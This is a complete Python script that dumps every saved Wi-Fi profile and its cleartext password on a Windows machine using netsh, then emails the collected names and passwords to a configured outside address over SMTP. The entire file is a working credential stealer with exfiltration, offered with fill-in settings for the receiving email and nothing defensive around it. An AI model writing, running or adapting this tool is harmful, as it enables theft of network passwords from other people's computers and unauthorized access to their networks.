import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# the email you want the data delivered to
delivery_email = ''
# your name
name = ''
# the email address the data will be sent FROM
sending_email = ''
# the password for the email address above
sending_email_password = ''
# please note that depending on the specific server, you may have to change the method
# that uses the below parameters from SMTP_SSL() to SMTP() or something else
# name of smtp server for email above (ex. smtp.gmail.com)
smtp_name = ''
# port number for smtp server (usually 25, 465, or 587)
smtp_port = <NUM>

finalList = ''

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
networks = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for network in networks:
    try:
        passwords = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', 'name=', network, 'key=clear']).decode('utf-8').split('\n')
        passwords = [line.split(':')[1][1:-1] for line in passwords if "Key Content" in line]
    except subprocess.CalledProcessError:
        finalList += f'Name: {network}, Password: Error\n'
        continue
    try:
        finalList += f'Name: {network}, Password: {passwords[0]}\n'
    except IndexError:
        finalList += f'Name: {network}, Password: Not Read\n'

# subject of email
subject = 'Return'
# message in body of email
message = finalList

# start mail server. YOU MAY HAVE TO CHANGE THE FUNCTION DEPENDING ON THE SERVER
server = smtplib.SMTP_SSL(smtp_name, smtp_port)

server.ehlo()

# log in to mail server using a file (or just type password in)
server.login(sending_email, sending_email_password)

# creating the message:
msg = MIMEMultipart()
msg['From'] = name
msg['To'] = delivery_email
msg['Subject'] = subject
msg.attach(MIMEText(message, 'plain'))

text = msg.as_string()

server.sendmail(sending_email, delivery_email, text)
